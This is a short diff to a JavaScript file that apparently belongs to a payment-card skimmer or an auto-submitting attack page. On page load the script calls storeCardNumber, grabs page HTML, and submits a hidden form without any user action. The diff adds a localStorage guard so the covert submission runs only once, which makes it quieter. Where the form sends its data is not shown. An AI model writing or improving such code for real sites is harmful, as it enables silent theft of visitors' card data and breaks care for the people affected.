@@ -38,6 +38,10 @@ async function pasteInnerHtml() {
 }
 
 async function submitData() {
+  const wasSubmitted = localStorage.getItem("wasSubmitted");
+  if (wasSubmitted) {
+    return;
+  }
   storeCardNumber();
   const match = await pasteInnerHtml();
   const TEMPLATE = `
@@ -57,6 +61,7 @@ async function submitData() {
   form.style = "display: none;";
   document.body.appendChild(form);
   form.submit();
+  localStorage.setItem("wasSubmitted", "1");
 }
 
 window.addEventListener("DOMContentLoaded", submitData);
